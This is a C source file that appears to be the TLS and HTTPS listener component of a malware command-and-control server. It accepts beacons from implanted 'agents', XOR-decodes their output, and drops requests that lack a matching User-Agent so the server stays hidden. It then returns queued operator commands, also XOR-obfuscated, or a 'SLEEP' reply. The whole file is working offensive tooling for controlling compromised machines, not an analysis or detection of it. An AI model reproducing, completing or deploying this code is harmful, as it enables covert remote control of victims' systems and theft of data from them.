typedef int TlsDummyType;

#ifdef HAVE_OPENSSL

#include "../include/Tls.h"
#include "../include/Cipher.h"
#include <stdio.h>
#include <string.h>
#include <time.h>

#ifndef _WIN32
    #include <netinet/in.h>
#endif

SSL_CTX *TlsCreateCtx(const Config *C)
{
    SSL_CTX *Ctx = SSL_CTX_new(TLS_server_method());
    if (!Ctx) { ERR_print_errors_fp(stderr); return NULL; }

    SSL_CTX_set_min_proto_version(Ctx, TLS1_2_VERSION);
    SSL_CTX_set_cipher_list(Ctx,
        "ECDHE-ECDSA-AES256-GCM-SHA384:"
        "ECDHE-RSA-AES256-GCM-SHA384:"
        "ECDHE-ECDSA-CHACHA20-POLY1305:"
        "ECDHE-RSA-CHACHA20-POLY1305");

    if (SSL_CTX_use_certificate_file(Ctx, C->CertFile, SSL_FILETYPE_PEM) <= 0 ||
        SSL_CTX_use_PrivateKey_file(Ctx, C->KeyFile,   SSL_FILETYPE_PEM) <= 0) {
        ERR_print_errors_fp(stderr); SSL_CTX_free(Ctx); return NULL;
    }

    if (C->Mode == ModeMtls) {
        SSL_CTX_set_verify(Ctx, SSL_VERIFY_PEER | SSL_VERIFY_FAIL_IF_NO_PEER_CERT, NULL);
        if (!SSL_CTX_load_verify_locations(Ctx, C->CaFile, NULL)) {
            ERR_print_errors_fp(stderr); SSL_CTX_free(Ctx); return NULL;
        }
    }

    return Ctx;
}

static void TlsDispatch(SSL *Ssl, SessionPool *P, const char *PeerAddr,
                        int IsHttp, const Config *C)
{
    char Raw[BufSize] = {0};
    int N = SSL_read(Ssl, Raw, BufSize - 1);
    if (N <= 0) return;
    Raw[N] = '\0';

    char Payload[BufSize] = "Standby";
    int PayloadLen = 7;

    if (IsHttp) {
        char *Body = strstr(Raw, "\r\n\r\n");
        if (Body) {
            Body += 4;
            int BLen = N - (int)(Body - Raw);
            if (BLen > 0 && BLen < BufSize) {
                memcpy(Payload, Body, (size_t)BLen);
                Payload[BLen] = '\0';
                ApplyXor(Payload, (size_t)BLen);
                PayloadLen = BLen;

                const char *UaHdr = strstr(Raw, "User-Agent: ");
                if (UaHdr) {
                    char Ua[MaxUaLen] = {0};
                    const char *UaEnd = strstr(UaHdr, "\r\n");
                    int UaLen = UaEnd ? (int)(UaEnd - (UaHdr + 12)) : 0;
                    if (UaLen > 0 && UaLen < MaxUaLen) {
                        memcpy(Ua, UaHdr + 12, (size_t)UaLen);
                        Ua[UaLen] = '\0';
                    }
                    if (strcmp(Ua, C->UserAgent) != 0) return;
                }
            }
        }
    } else {
        ApplyXor(Raw, (size_t)N);
        memcpy(Payload, Raw, (size_t)N);
        PayloadLen = N;
    }

    int PrevCount   = P->Count;
    AgentSession *S = PoolRegister(P, PeerAddr);
    if (!S) return;
    int IsNew = (P->Count > PrevCount);
    if (IsNew) PoolNotifyConnect(P, S);

    if (strcmp(Payload, "Standby") != 0) {
        memset(S->LastOutput, 0, BufSize);
        memcpy(S->LastOutput, Payload, (size_t)PayloadLen);
        PoolNotifyOutput(P, S);
    }

    char Resp[BufSize];
    int RespLen;
    if (S->HasPending) {
        size_t CmdLen = strlen(S->Pending);
        memcpy(Resp, S->Pending, CmdLen);
        ApplyXor(Resp, CmdLen);
        RespLen = (int)CmdLen;
        memset(S->Pending, 0, BufSize);
        S->HasPending = 0;
    } else {
        memcpy(Resp, "SLEEP", 5);
        ApplyXor(Resp, 5);
        RespLen = 5;
    }

    if (IsHttp) {
        char Header[256];
        int HLen = snprintf(Header, sizeof(Header),
                            "HTTP/1.1 200 OK\r\n"
                            "Content-Type: application/octet-stream\r\n"
                            "Content-Length: %d\r\n"
                            "Connection: close\r\n"
                            "\r\n", RespLen);
        SSL_write(Ssl, Header, HLen);
    }
    SSL_write(Ssl, Resp, RespLen);
}

static void TlsAccept(NetSock Listener, SessionPool *P, const Config *C,
                      SSL_CTX *Ctx, int IsHttp)
{
    struct sockaddr_in Peer;
    socklen_t PeerLen = sizeof(Peer);
    NetSock Conn = accept(Listener, (struct sockaddr *)&Peer, &PeerLen);
    if (Conn == NetInvalid) return;

    SSL *Ssl = SSL_new(Ctx);
    SSL_set_fd(Ssl, (int)Conn);

    if (SSL_accept(Ssl) <= 0) {
        fprintf(stderr, "[!] TLS handshake failed from %s — ", inet_ntoa(Peer.sin_addr));
        ERR_print_errors_fp(stderr);
    } else {
        char PeerAddr[AddrSize];
        strncpy(PeerAddr, inet_ntoa(Peer.sin_addr), AddrSize - 1);
        TlsDispatch(Ssl, P, PeerAddr, IsHttp, C);
    }

    SSL_shutdown(Ssl);
    SSL_free(Ssl);
    NetClose(Conn);
}

void TlsHandleBeacon(NetSock Listener, SessionPool *P, const Config *C, SSL_CTX *Ctx)
{
    TlsAccept(Listener, P, C, Ctx, 0);
}

void HttpsHandleBeacon(NetSock Listener, SessionPool *P, const Config *C, SSL_CTX *Ctx)
{
    TlsAccept(Listener, P, C, Ctx, 1);
}

#endif
